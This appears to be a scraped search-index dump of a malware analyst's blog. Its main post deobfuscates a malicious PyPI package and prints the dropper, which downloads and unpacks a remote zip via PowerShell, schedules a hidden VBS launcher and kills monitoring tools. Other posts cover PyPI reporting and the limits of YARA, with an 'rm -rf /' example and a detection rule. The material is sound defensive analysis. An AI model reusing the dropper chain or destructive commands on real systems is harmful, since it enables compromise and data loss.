CRlbnY6dG1wL2luc3QuemlwIC1EZXN0aW5hdGlvblBhdGggQzovUHJvZ3JhbURhdGE\\ 7IFJlbW92ZS1JdGVtICRlbnY6dG1wL2luc3QuemlwIikKICAgICAgICBmcm9tIGRhd\\ GV0aW1lIGltcG9ydCBkYXRldGltZSwgdGltZWRlbHRhOyB0ID0gKGRhdGV0aW1lLm5\\ vdygpICsgdGltZWRlbHRhKG1pbnV0ZXM9MSkpLnN0cmZ0aW1lKCclSDolTScpCiAgI\\ CAgICAgcjIoZidzY2h0YXNrcyAvQ3JlYXRlIC9TQyBPTkNFIC9TVCB7dH0gL1ROICJ\\ VcGRhdGVyIiAvVFIgIkM6XFByb2dyYW1EYXRhXEluc3RhbGxcaW52aXMudmJzIicp\u0026#34;)) So let\u0026rsquo;s unpack this a bit. As with most of these, you can simply swap the exec for a print and out will pop the \u0026lsquo;obfuscated\u0026rsquo; payload.\nimport subprocess, os def r(c): result = subprocess.Popen(c, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, close_fds=True) output = result.stdout.read() def r2(c): subprocess.Popen(c, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, close_fds=True) if os.name == \u0026#34;nt\u0026#34;: if not os.path.exists(r\u0026#34;C:/ProgramData/Updater\u0026#34;): r(r\u0026#34;powershell -command $ProgressPreference = \u0026#39;SilentlyContinue\u0026#39;; $ErrorActionPreference = \u0026#39;SilentlyContinue\u0026#39;; Invoke-WebRequest -UseBasicParsing -Uri xxxx://transfer.sh/xxxx/Install.zip -OutFile $env:tmp/inst.zip; Expand-Archive -Force -LiteralPath $env:tmp/inst.zip -DestinationPath C:/ProgramData; Remove-Item $env:tmp/inst.zip\u0026#34;) from datetime import datetime, timedelta; t = (datetime.now() + timedelta(minutes=1)).strftime(\u0026#39;%H:%M\u0026#39;) r2(f\u0026#39;schtasks /Create /SC ONCE /ST {t} /TN \u0026#34;Updater\u0026#34; /TR \u0026#34;C:\\ProgramData\\Install\\invis.vbs\u0026#34;\u0026#39;) Now this is a little more exciting. As we can see, we use Powershell\u0026rsquo;s Invoke-WebRequest to quietly curl down an install.zip file from transfer.sh and to unpack it into a known location. It then invokes the Windows Task Scheduler to execute invis.vbs a minute after the subprocess is executed. Presumably, this is to allow for the file to download and decompress. But what exactly do these files contain, and what is invis.vbs doing?\nSet oShell = CreateObject (\u0026#34;Wscript.Shell\u0026#34;) Dim strArgs strArgs = \u0026#34;cmd /c pythonw C:\\ProgramData\\Install\\inst.pyw\u0026#34; oShell.Run strArgs, 0, false This creates a WScript Shell, which invokes inst.pyw. We\u0026rsquo;re now at Russian nesting dolls of staging. But bare with me, because this is where it gets interesting. As I said, the initial file dropped installer.zip was a ziparchive and decompressed during download. The file also contained the pyarmor_runtime and inst.pyw files. These, as you can likely glean by the name alone, are PyArmor obfuscated files. This presents a unique challenge, PyArmor unpackers are well documented running up to Python 3.10, but recent changes to the bytecode and opmaps in Python 3.11 have caused many of the ways these deobfuscators function to fail. And as anticipated, several off-the-shelf unpackers like Svenskithesource\u0026rsquo;s PyArmor-Unpacker were ineffective at handling this new bytecode change.\nDynamic Analysis # So with our static unpackers struggling to work through the PyArmor obfuscation, we shifted to dynamic analysis. I mentioned Lockness Ko earlier in the article; he was kind enough to lend a Dynamic Analysis sandbox for the next portion. We began as most dynamic analysis solutions do\u0026ndash; spinning up PCAP and packet sniffing software, turning on ProcMon and running the program. The first time we managed to get the program to run in the sandbox, Wireshark immediately died. A good indicator that we\u0026rsquo;re dealing with something that\u0026rsquo;s attempting to enumerate the virtual machine. We moved network monitoring out of the sandbox and tried again\u0026hellip; And not much happened. We killed the process and pulled up ProcMon to see if there was something we were missing, but we weren\u0026rsquo;t catching a whole lot. So in the spirit of seeing if this was some sort of delayed execution, we went ahead and ran the file one more time and let it sit for what felt like an eternity. And we waited. And we waited. And at last, we had something. ProcMon started firing off system events for enumeration of the current environment:\n\u0026#34;10:09:44.5260407 PM\u0026#34;,\u0026#34;WScript.exe\u0026#34;,\u0026#34;3396\u0026#34;,\u0026#34;Process Create\u0026#34;,\u0026#34;C:\\Windows\\System32\\cmd.exe\u0026#34;,\u0026#34;SUCCESS\u0026#34;,\u0026#34;PID: 4292, Command line: \u0026#34;\u0026#34;C:\\Windows\\System32\\cmd.exe\u0026#34;\u0026#34; /c pythonw C:\\ProgramData\\Install\\inst.pyw\u0026#34; \u0026#34;10:09:45.6561948 PM\u0026#34;,\u0026#34;pythonw.exe\u0026#34;,\u0026#34;5020\u0026#34;,\u0026#34;Process Create\u0026#34;,\u0026#34;C:\\Program Files\\Python311\\Scripts\\pip.exe\u0026#34;,\u0026#34;SUCCESS\u0026#34;,\u0026#34;PID: 1188, Command line: pip install requests\u0026#34; \u0026#34;10:09:52.1659818 PM\u0026#34;,\u0026#34;pythonw.exe\u0026#34;,\u0026#34;5020\u0026#34;,\u0026#34;Process Create\u0026#34;,\u0026#34;C:\\Program Files\\Python311\\Scripts\\pip.exe\u0026#34;,\u0026#34;SUCCESS\u0026#34;,\u0026#34;PID: 2064, Command line: pip install cryptography\u0026#34; \u0026#34;10:10:07.6860549 PM\u0026#34;,\u0026#34;pythonw.exe\u0026#34;,\u0026#34;5020\u0026#34;,\u0026#34;Process Create\u0026#34;,\u0026#34;C:\\Windows\\System32\\Wbem\\wmic.exe\u0026#34;,\u0026#34;SUCCESS\u0026#34;,\u0026#34;PID: 1476, Command line: wmic process get name\u0026#34; \u0026#34;10:10:08.4851339 PM\u0026#34;,\u0026#34;pythonw.exe\u0026#34;,\u0026#34;5020\u0026#34;,\u0026#34;Process Create\u0026#34;,\u0026#34;C:\\Windows\\system32\\cmd.exe\u0026#34;,\u0026#34;SUCCESS\u0026#34;,\u0026#34;PID: 1436, Command line: C:\\Windows\\system32\\cmd.exe /c \u0026#34;\u0026#34;taskkill /f /im wireshark.exe\u0026#34;\u0026#34;\u0026#34; \u0026#34;10:10:08.4951144 PM\u0026#34;,\u0026#34;pythonw.exe\u0026#34;,\u0026#34;5020\u0026#34;,\u0026#34;Process Create\u0026#34;,\u0026#34;C:\\Windows\\system32\\cmd.exe\u0026#34;,\u0026#34;SUCCESS\u0026#34;,\u0026#34;PID: 4632, Command line: C:\\Windows\\system32\\cmd.exe /c \u0026#34;\u0026#34;taskkill /f /im dumpcap.exe\u0026#34;\u0026#34;\u0026#34; \u0026#34;10:10:08.5035489 PM\u0026#34;,\u0026#34;pythonw.exe\u0026#34;,\u0026#34;5020\u0026#34;,\u0026#34;Process Create\u0026#34;,\u0026#34;C:\\Windows\\system32\\cmd.exe\u0026#34;,\u0026#34;SUCCESS\u0026#34;,\u0026#34;PID: 3844, Command line: C:\\Windows\\system32\\cmd.exe /c \u0026#34;\u0026#34;taskkill /f /im processhacker.exe\u0026#34;\u0026#34;\u0026#34; \u0026#34;10:10:08.5120777 PM\u0026#34;,\u0026#34;pythonw.exe\u0026#34;,\u0026#34;5020\u0026#34;,\u0026#34;Process Create\u0026#34;,\u0026#34;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\u0026#34;,\u0026#34;SUCCESS\u0026#34;,\u0026#34;PID: 1052, Command line: powershell.exe get-process | format-table mainwindowtitle\u0026#34; Now I\u0026rsquo;d like to draw some attention to several lines here. taskkill /f /im wireshark.exe - The source of our dead Wireshark on the first run. pip install requests and pip install cryptography will be very important very soon. We can see the outbound beaconing in Wireshark, given that we\u0026rsquo;ve moved Wireshark outside of the virtual machine. We can see it calling to a tor.pm address in our PCAP\u0026rsquo;s. Since we\u0026rsquo;re not catching the events in process monitor, this must mean that the call is coming from inside the house the requests are being transmitted through Python. But what is this actually doing, what information is being communicated?\nWell as previously mentioned, we saw requests and cryptography installed through subprocesses. So that gives us some good intuition about the kind of interface we might be dealing with for this information. Intuition dictated that hooking the requests POST API function might spill out the information we\u0026rsquo;re looking for. So we did just that.\nrequests/api.py\ndef post(url, data=None, json=None, **kwargs): with open(\u0026#34;C:\\Windows\\Temp\\post.txt\u0026#34;, \u0026#34;a\u0026#34;) as f: f.write(url, data, json, sep=\u0026#39;\\n\u0026#39;) ... Running this, as anticipated, caused any POSTs utilizing the Python Requests package to write themselves to a file. We went ahead and ran the script again and\u0026hellip;\nREQUEST xxxx://xxxx.tor.pm/ {\u0026#39;1\u0026#39;: \u0026#39;gAAAAABkoRHTIO_HSkSBxDbFaarHWwX8T1qKIUgbuhaf0-294oY_TR1RuYFPVXYBkG5lQIKw2rRV7oPxL-CaKsiPerMKdwV5sUO1MEn3GZw3RToeSQXqvYo=\u0026#39;, ...} And that\u0026rsquo;s not shockingly helpful. However, we do have some excellent pretext for what this information might actually be! If you recall earlier, the cryptography package was installed during the execution of the malware. Fernet is a very common cryptography format used in Python, and more importantly, the gAAAAABrefers to a fairly fixed portion, the \u0026ldquo;fixed\u0026rdquo; timestamp. This allowed us to confirm that these were indeed Fernet encrypted payloads. For those unfamiliar with Fernet, it is a symmetric encryption algorithm utilizing a key. For our purposes, that is the brief of it. For those looking to read more, you can find a writeup on Fernet encryption in the PYCA Cryptography documents. Equipped with that information, we went ahead and enumerated the Cryptography package as well. Utilizing the same techniques we used in the requests modification, we hooked the generate_key() and encrypt() functions to also write their arguments to a file. So, for one final, time, we went ahead and ran the program, with all the appropriate functions hooked. And it worked perfectly!\n======== model vbox harddisk ============== product virtualbox ============== version vbox- 1 ============== name system idle process system registrysmss.execsrss.exe wininit.exeservices.exe lsass.exe svchost.exesvchost.exefontdrvhost.exe svchost.exesvchost.exesvchost.exesvchost.exesvchost.exesvchost.exesvchost.exesvchost.exesvchost.exesvchost.exesvchost.exesvchost.exesvchost.exesvchost.exesvchost.exesvchost.exesvchost.exesvchost.exesvchost.exesvchost.exesvchost.exesvchost.exesvchost.exesvchost.execsrss.exe winlogon.exe fontdrvhost.exe dwm.exe sihost.exe taskhostw.exe explorer.exe shellexperiencehost.exeruntimebroker.exeruntimebroker.exeapplicationframehost.exe svchost.exediscord.exediscord.exediscord.exediscord.exediscord.exediscord.exegooglecrashhandler.exe googlecrashhandler64.exe procmon64.exe cmd.exe conhost.exepowershell.exechrome.exe chrome.exe chrome.exe chrome.exe chrome.exe chrome.exe chrome.exe chrome.exe cmd.exe conhost.exepythonw.exewmiprvse.exe wmic.execonhost.exe Quite underwhelmingly, this seems to enumerate running processes and user information and signal back to the server. There were no other signs of additional downloads or file drops.\nSummary # This is but one example of how we can effectively use some creative process hooking and know-how to cause cryptographic functions to spill their secrets when they\u0026rsquo;re relying on external libraries and packages to do that transmission. Dynamic analysis can facilitate introspection into programs that might otherwise use heavy obfuscation, and Python\u0026rsquo;s reputation as an interpreted language makes levying the base level libraries and infrastructure a breeze to enumerate obfuscated malware.\n","date":"12 July 2023","externalUrl":null,"permalink":"/posts/dearmored/","section":"Posts","summary":"Looking deeper into PyArmor obfuscated malware utilizing tools such as Process Monitor and Wireshark, and hooking third party libraries to gain access to web requests and encrypted data.","title":"Dearmored","type":"posts"},{"content":"","date":"12 July 2023","externalUrl":null,"permalink":"/tags/deobfuscation/","section":"Tags","summary":"","title":"Deobfuscation","type":"tags"},{"content":"To those that may or may not know, Vipyr Security was recently invited to discuss what a malicious package reporting API might look like with the Python Software Foundation and Python Packaging oversight entities. Frankly, this is pretty cool. A step towards legitimacy, if you will. We have a lot of ideas (some of which I intend to discuss in this article). BUT I harbor concerns about the lifecycle of an ecosystem that relies entirely on third party reports to police the platform. We\u0026rsquo;ve largely held the belief that utilizing the open source community itself to secure the open source community is one of the more effective ways to tame a near endless torrent of malware. However, this comes at a cost, both in the literal sense, as the monetary burden of shifting antimalware services and detection away from the oversight body, as well as an implicit cost of organizational stability. Let\u0026rsquo;s discuss.\nCrowdsourcing Open Source Security # I got into Python anti-malware services initially as a desire to protect the users of some of the communities I was in. At the time, packages were circulating and members of the community were being deliberately targeted with malicious Python packages, and PyPI had many of the tools in place to allow for a feeble attempt at manually enumerating new and updated packages. I would wake up in the morning, make some coffee, and stare at the RSS feed for Python\u0026rsquo;s new package uploads for hours. Shockingly, this actually proved fairly effective. Many malicious packages used the same or similar names, often just updating a version number in the title or using another Python related word. (piplibraryscraper, pypilibraryscraping, etc.)\nI hand rolled some tools to assist me in the spotting of these packages, but ultimately it was still very much an individual review process. I detected, reversed, and reported roughly 50 packages this way in a little under a month. But the amount of time I could spend doing this was rapidly becoming limited, and the need for automation increased.\nSeveral individuals in the community caught wind of the project, and the engagement in the project swelled rapidly from just myself, to a team of almost 30 individuals at one point. People want to help. Malware is cool, it\u0026rsquo;s sexy, it\u0026rsquo;s interesting. Saying you handle, analyze, and prevent malicious software propagation often has the same implications as saying you regularly handle explosives. This is software designed to ruin your day, at the very least. I would say that this motivated a large portion of the interest in the project early on.\nWe rapidly developed a set of tools to automatically parse the Python Package Index feed using VirusTotal\u0026rsquo;s YARA rules to enumerate the behavior of these packages in a safe way. Dynamic analysis has largely been an organizational needs, but in the absence of the infrastructure to support automated dispatching of things like Cuckoo sandboxes for the analysis of the endless torrent of packages, YARA offered a comfortable starting point.\nConceptualizing the API # Given the idea of the freedom to discuss and develop an API in conjunction with the administrative bodies at the Python Software Foundation, what might that actually look like?\nStandardizing The Reporting Methodology # There is no shortage of standards in regards to Cybersecurity information. Commonly accepted is the ATT\u0026amp;CK Matrix. As it stands now, we have no introspection into what other organizations are reporting, and how they\u0026rsquo;re reporting. On our end, while it would drive an enormous amount of work to tie specific detections with YARA to the ATT\u0026amp;CK matrix, the most logical way we can conceptualize automated aggregation of malware tactics and techniques is the ATT\u0026amp;CK matrix itself. Long has the idea lingered in the back of my head that grouping YARA rules based on the ATT\u0026amp;CK matrix will make for a more effective reporting schema.\nHowever, this too, has caveats. Not everything is black and white when it comes to tying the behavior of a specific detection point to a specific ATT\u0026amp;CK technique. This would often levy an enormous burden on cybersecurity researchers to reach the accepted, standardized format. To the best of my knowledge, each of these organizations have developed their own rules and detection techniques, even if we\u0026rsquo;re all using similar tools under the hood.\nSo with that in mind, could we report it by the overarching type of malware? Generic info-stealers have long since reigned supreme on the Python Package Index, and detections of things like CobaltStrike Beacons, Webshells/Reverse Shells, etc., have largely been fairly limited. That isn\u0026rsquo;t to say these attacks might not surface in the future, but at the moment, a reasonable solution for standardized reporting might simply be classifying the malware itself.\nFacilitating Knowledge Sharing # PyPI\u0026rsquo;s underlying infrastructure allows for packages to be removed from the packaging index without removing the files themselves. This is a tremendous boon to security researchers; we have the ability to retrieve samples that have long since been removed from public eyes. There are some complexities to this however. Python Packages are indexed into the PythonHosted file CDN utilizing the hash of the package itself. This means that retrieving a package requires knowledge of the hash prior to removal, as PyPI is the principle (read: only) way to obtain the hash if it was not recorded elsewhere at the time of publishing.\nIt is, conceptually to me at least, a reasonable ask to allow for trusted reporters to have access to an additional API on the Python Package Index that still serves information regarding removed packages. The PythonHosted link, or at bare minimum the hash of the file itself to facilitate in the reconstruction of the PythonHosted URL is a baseline requirement if packages are to be retrieved from PythonHosted in the future.\nAdditionally, pivoting a bit from the above, we have no introspection in the detections we are not making. I am under no illusion that our detection schemes are perfect, and I find that far more of my time is spent now looking for other organization\u0026rsquo;s detections and what we might\u0026rsquo;ve missed, than analyzing packages that we successfully detected. The ability to mark a package as removed for malicious behavior, and to communicate that message to trusted reporters is paramount if the model of crowd-sourcing PyPI security is to succeed. While this harbors implications of business intelligence degradation; that is, there is tangible money in the detections that for-profit organizations are making, relying on that layered security without communicating the results of those detections, at bare minimum the package itself, is dangerous.\nThe largest portion of automation in the Python anti-malware effort will come from aggregating reports from multiple organizations and using that to verdict packages. If rules are proprietary, and package removals are not communicated across the trusted reporter community, it is likely that while one organization may have an effective rule or detection, other organizations could be entirely unaware of that particular package\u0026rsquo;s existence.\nThe Burden of Crowdsourcing # I spoke briefly about the literal and development costs of Python package security in the introduction. I don\u0026rsquo;t want to mince words, Vipyr Security is funded entirely out of pocket by myself, with no desire to solicit funding or incorporation. My intention is to ensure that there remains a community that is not beholden to stakeholder requirements or profit margins, that is solely focused on Cybersecurity in the open source ecosystem. Full stop.\nBut, while our organization is a mere drop in the bucket for the swathe of organizations detecting and reporting Python malware, what happens when it no longer becomes a profitable venture for some of the companies acting as cross-checks for each other? As third party reporting organizations may flux in the coming years as companies go under, rise, and go under again, the ability to cross check each other using the council or trusted reporter mentality may wax and wane in efficacy.\nAnd more so, what happens when our developers lose interest? I\u0026rsquo;m unaware of other communities that are dedicated specifically to the reduction of proliferation of malware in the context of Python, and even more so\u0026ndash; acutely aware that our numbers vastly eclipse those of some of the companies that are doing this on a for-profit scale. Our business model is unsustainable for prolonged interest of the 30 members of our community dedicating the overwhelming majority of their time towards these projects, and this overall has a negative burden on the ecosystem itself; as we\u0026rsquo;ve discussed, these reports are more effective when multiple organizations make these detections.\nClosing Remarks # This was a long one. Securing Python is hard. I\u0026rsquo;m under no illusion that we\u0026rsquo;ve created something evergreen, but it\u0026rsquo;s my hope that we can work with the Python Software Foundation to pave the way for subsequent organizations to use the tools we discuss and release to facilitate the reduction of malware in Python and open source ecosystems as a whole. I\u0026rsquo;m not sure that an organization divesting it\u0026rsquo;s entire security posture into third party reporting is something that\u0026rsquo;s been accomplished before, and I think it bears both tremendous risk if done incorrectly, and benefit if done intelligently.\n","date":"12 July 2023","externalUrl":null,"permalink":"/posts/pypi-security/","section":"Posts","summary":"To those that may or may not know, Vipyr Security was recently invited to discuss what a malicious package reporting API might look like with the Python Software Foundation and Python Packaging oversight entities.","title":"PyPI Security","type":"posts"},{"content":"Open source security is something fairly important to me. Ensuring individuals have the ability to learn and develop their skills in a secure environment is something I believe everyone has an entitled right to. Unfortunately, the overwhelmingly vast majority of new users are overwhelmed by the options they might find on open source sharing sites and package indexes such as GitHub and the Python Package Index (PyPI).\nThis overwhelmed feeling can lead to an increased vulnerability for new users to attacks such as typosquatting and dependency confusion. The unfortunate reality is that this presents a barrier to entry that many people may not necessarily even know exists\u0026ndash; that is, identifying and selecting quality dependencies is an acquired skill.\nIdentifying Behaviors # When we talk about \u0026lsquo;detection\u0026rsquo; in a cybersecurity context, the average user is going to look at their endpoint detection systems and antiviruses and rely on the level of trust in those systems to secure their particular work environments. Unfortunately, there\u0026rsquo;s a level of implicit trust in certain embedded Python processes that makes detecting these actions virtually impossible. The average flux of the internet makes mapping out specific threats from benign packages exceedingly difficult.\nConsider the following:\nimport subprocess def not_mal_func(package_name): subprocess.run([\u0026#39;pip\u0026#39;,\u0026#39;install\u0026#39;, package_name]) This represents a fairly frequent use case for installing dependencies that might be missing for authors that are unaware of the pragmatics of the packaging solutions that exist in Python. Where we would normally identify dependencies in requirements.txt or pyproject.toml, users will often simply try to import a package, catch the exception, and pip install the missing package.\nWhile this might solve this missing dependency issue entirely, the freedom of choice creates a circumstance where this code snippet is virtually indistinguishable from a malicious codebase. Applying rigorous standards for packaging types, while ideal, does not prevent individuals from doing this within their codebase as well. Ultimately, the freedom of the language limits our ability to detect certain threat profiles as well.\nThis is but one example of how ambiguity in the language itself can lead to a lack of introspection into the functions themselves. So, how can we possibly profile this? We have a few different ways to detect malicious behavior in Cybersecurity, chiefly signature detection, heuristics analysis, and statistical/analytical modeling (AI/ML).\nSignature Detection # In signature detection, many organizations will use file hashes or YARA rules to map out specific threat profiles. The tradeoff of YARA and file hashing is specificity. Whitespace issues in files will create circumstances where the hash is no longer relevant, and YARA rules in most circumstances cannot distinguish the context that a function is called in.\nFor example\u0026hellip;\nimport os def foo(): os.system(\u0026#39;rm -rf /\u0026#39;) This clearly presents at minimum an undesirable function to run on a Unix based system. Perhaps we would consider writing a YARA rule to detect it. ..\nrule delete_filesystem{ meta: description = \u0026#34;Detects the deletion of the root directory.\u0026#34; os = \u0026#34;linux\u0026#34; strings: $command = \u0026#34;rm -rf /\u0026#34; condition: any of them } On the above, we\u0026rsquo;re explicitly looking for the string rm -rf /. Now let\u0026rsquo;s consider running that on the ~500,000 Python packages on the index right now. What we\u0026rsquo;ll quickly find is that we have numerous flags on non-malicious usage of the string, chiefly in docstrings.\ndef safe_func(): \u0026#34;\u0026#34;\u0026#34; ... prevents system commands such as rm -rf / ... \u0026#34;\u0026#34;\u0026#34; pass We might consider narrowing the scope, to strings such as os.system('rm -rf /') but this too, would suffer from issues whereby this can also be invoked as such subprocess.run(['rm', '-rf', '/']) and once again, our detection would fail. It shouldn\u0026rsquo;t be difficult to extrapolate that we would be chasing our tails trying to catch every instance of invocation of this precise string, and the functions that could be used to invoke it.\nThis is but one example of the challenges of writing YARA rules and using signature detection against an entire language\u0026rsquo;s packaging index. In subsequent posts, I intend to discuss SAST tools like Semgrep to attempt to refine the heuristics detection portion of our detection types, and allow YARA to do the bulk majority of the finegrained signature detection instead.\n","date":"11 July 2023","externalUrl":null,"permalink":"/posts/yara-challenges/","section":"Posts","summary":"Open source security is something fairly important to me.","title":"The Challenges of YARA","type":"posts"},{"content":" About Me # My name is Rem, I am a malware analyst and founder of Vipyr Security, an all volunteer open-source focused cybersecurity organization. My principle role at Vipyr Security is direction of day to day operations, incident response, and maintenance of our organization\u0026rsquo;s YARA ruleset and other detection schemas.\nIn addition to volunteering my time towards open source security, I am a supporting member of the Python Software Foundation, and dedicate a large portion of my time towards security of packaging ecosystems such as the Python Package Index.\nI can also be found on the Python Discord, where I contribute frequently towards Cybersecurity related discussions and help steer new members towards appropriate resources, answer questions, and assist in internal projects.\nTools \u0026amp; Languages # I am familiar with both Linux and Windows, and largely integrate my workflow between both operating systems as necessary. I use a large collection of virtual machines to facilitate the handling and reversal of Malware, to include Mandiant FLARE VM and REMnux, as well as self-built toolkits in MintOS and Ubuntu.\nAdditionally, I am familiar with debuggers and decompilers/disassemblers such as Ghidra, IDA Pro and Radare2. I\u0026rsquo;ve also authored my own disassembly toolkits to facilitate reverse engineering of specific files or executables on an ad-hoc basis.\nMost of my projects are written in Python, but I\u0026rsquo;m reasonably familiar with Java, and am currently spending a large portion of my time learning C++, Ruby, and the odds and ends snippets of other languages as they become applicable, or as my interests wander.\nGetting in Touch # The simplest way to contact me is through my Twitter handle @sudo_Rem.\n","date":"1 January 0001","externalUrl":null,"permalink":"/about/","section":"sudo rem","summary":"About Me # My name is Rem, I am a malware analyst and founder of Vipyr Security, an all volunteer open-source focused cybersecurity organization.","title":"","type":"page"},{"content":"","date":"1 January 0001","externalUrl":null,"permalink":"/authors/","section":"Authors","summary":"","title":"Authors","type":"authors"},{"content":"","date":"1 January 0001","externalUrl":null,"permalink":"/categories/","section":"Categories","summary":"","title":"Categories","type":"categories"},{"content":"","date":"1 January 0001","externalUrl":null,"permalink":"/series/","section":"Series","summary":"","title":"Series","type":"series"}]